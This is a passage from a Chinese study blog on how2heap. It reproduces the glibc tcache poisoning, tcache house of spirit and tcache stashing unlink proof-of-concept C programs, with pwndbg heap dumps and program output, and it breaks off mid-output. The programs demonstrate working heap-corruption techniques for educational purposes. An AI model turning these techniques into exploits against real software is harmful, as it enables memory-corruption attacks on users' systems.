<h3 id="tcache-poisoning-打fd"><a href="#tcache-poisoning-打fd" class="headerlink" title="tcache_poisoning(打fd)"></a>tcache_poisoning(打fd)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"</span></span><br><span class="line">		   <span class="string">"returning a pointer to an arbitrary location (in this case, the stack).\n"</span></span><br><span class="line">		   <span class="string">"The attack is very similar to fastbin corruption attack.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"</span></span><br><span class="line">		   <span class="string">"We have to create and free one more chunk for padding before fd pointer hijacking.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 2 buffers.\n"</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"</span></span><br><span class="line">		   <span class="string">"to point to the location to control (%p).\n"</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个攻击手法就是打fd达到任意地址申请。</p>
<p>首先创建两个0x80的堆块，然后都释放掉，改fd为目标地址，再申请两次就可以申请到目标地址。这个很简单就不多说了。</p>
<h3 id="tcache-house-of-spirit（在栈上伪造chunk）"><a href="#tcache-house-of-spirit（在栈上伪造chunk）" class="headerlink" title="tcache_house_of_spirit（在栈上伪造chunk）"></a>tcache_house_of_spirit（在栈上伪造chunk）</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates the house of spirit attack on tcache.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Ok. Let's start with the example!.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n"</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个手法核心就是在栈上伪造chunk，然后申请过去。</p>
<p>在栈上创建了一个数组变量，并设置对应chunk该有的东西。并将指针指向伪造的data那里(从tcache这里开始，指向的是data不是head)</p>
<p>然后将这个指针释放，这个数组也会进tcache bins中。这个时候malloc就申请到数组这个地方。手法还是挺简单的不详细写了</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates the house of spirit attack on tcache.</span><br><span class="line">It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.</span><br><span class="line">You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.</span><br><span class="line">(Search for strings "invalid next size" and "double free or corruption")</span><br><span class="line"></span><br><span class="line">Ok. Let's start with the example!.</span><br><span class="line"></span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">Let's imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It's size field is placed at 0x7fffffffdcd8</span><br><span class="line">This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdcd8.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7fffffffdcd8, which will be 0x7fffffffdce0!</span><br><span class="line">malloc(0x30): 0x7fffffffdce0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="tcache-stashing-unlink-attack-2-27-amp-2-29-smallbin-amp-calloc"><a href="#tcache-stashing-unlink-attack-2-27-amp-2-29-smallbin-amp-calloc" class="headerlink" title="tcache_stashing_unlink_attack(2.27&amp;2.29 smallbin &amp; calloc)"></a>tcache_stashing_unlink_attack(2.27&amp;2.29 smallbin &amp; calloc)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This file demonstrates the stashing unlink attack on tcache.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stack_var emulates the fake chunk we want to alloc to.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"First let's write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++){</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++){</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>此攻击方式适用于2.27和2.29。首先申请了三个变量，stack_var，chunk_lis，target。将stack_var[2]的地址给了stack_var[3]，接着malloc9个0x90大小的chunk并存入chunk_lis中。接下来将3-9放入tcache中，然后释放1, 0, 2。如下图可以看到1作为最后一个tcache bin。而0和2被放入了unsortedbin。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/14.png"></p>
<p>现在申请一个0xa0大小的size，因为unsortedbin的分配机制，在unsortedbin中没有符合的size大小那么0和2会放入smallbin中。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x55555555b390</span> —▸ <span class="number">0x55555555b250</span> —▸ <span class="number">0x7ffff7dcfd30</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55555555b390</span></span><br></pre></td></tr></tbody></table></figure>

<p>现在申请两个0x90大小的size，因为tcachebins中符合条件所以这两个chunk会从tcache bin中取，此时tcachebin中还有五个。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55555555b6c0</span> —▸ <span class="number">0x55555555b620</span> —▸ <span class="number">0x55555555b580</span> —▸ <span class="number">0x55555555b4e0</span> —▸ <span class="number">0x55555555b440</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>

<p>假如现在有一个漏洞可以将2的bk-&gt;stack_var。这个时候stack_var默认是一个被放入smallbin中的chunk</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55555555b390</span> —▸ <span class="number">0x55555555b250</span> —▸ <span class="number">0x7ffff7dcfd30</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55555555b390</span></span><br><span class="line">BK: <span class="number">0x55555555b250</span> —▸ <span class="number">0x55555555b390</span> —▸ <span class="number">0x7fffffffdbc0</span> —▸ <span class="number">0x7fffffffdbd0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>

<p><code>calloc不会从tcache中取bin</code>。利用这个特性我们利用calloc申请0x90大小的chunk，因为small bin满足条件，所以会将small bin中的2给取出来，又因为tcache中还有2个位置，stack_var和0会被放入tcache中。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffdbd0</span> —▸ <span class="number">0x55555555b3a0</span> —▸ <span class="number">0x55555555b6c0</span> —▸ <span class="number">0x55555555b620</span> —▸ <span class="number">0x55555555b580</span> —▸ <span class="number">0x55555555b4e0</span> —▸ <span class="number">0x55555555b440</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55555555b390</span> —▸ <span class="number">0x55555555b6c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x7fffffffdbd0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>

<p>现在申请0x90大小的chunk就会从tcache中取了，达到目标。</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates the stashing unlink attack on tcache.</span><br><span class="line"></span><br><span class="line">This poc has been tested on both glibc <span class="number">2.27</span> and glibc <span class="number">2.29</span>.</span><br><span class="line"></span><br><span class="line">This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it<span class="number">'</span>s necessary to alloc a chunk with <span class="built_in">calloc</span> at least once. Last not least, we need a writable address to bypass check in glibc</span><br><span class="line"></span><br><span class="line">The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.</span><br><span class="line"></span><br><span class="line">This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this <span class="keyword">case</span> we<span class="number">'ll</span> create the chunk on the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">Stack_var emulates the fake chunk we want to alloc to.</span><br><span class="line"></span><br><span class="line">First let<span class="number">'</span>s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[<span class="number">2</span>] as the fake bk. Later we can see *(fake_chunk-&gt;bk + <span class="number">0x10</span>) which is stack_var[<span class="number">4</span>] will be a libc addr after attack.</span><br><span class="line"></span><br><span class="line">You can see the value of fake_chunk-&gt;bk is:<span class="number">0x7fffffffdcb0</span></span><br><span class="line"></span><br><span class="line">Also, let<span class="number">'</span>s see the initial value of stack_var[<span class="number">4</span>]:(nil)</span><br><span class="line"></span><br><span class="line">Now we alloc <span class="number">9</span> chunks with <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">free</span> <span class="number">7</span> of them in order to put them into tcache. Carefully we didn<span class="number">'</span>t <span class="built_in">free</span> a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins <span class="keyword">while</span> chunk0 and 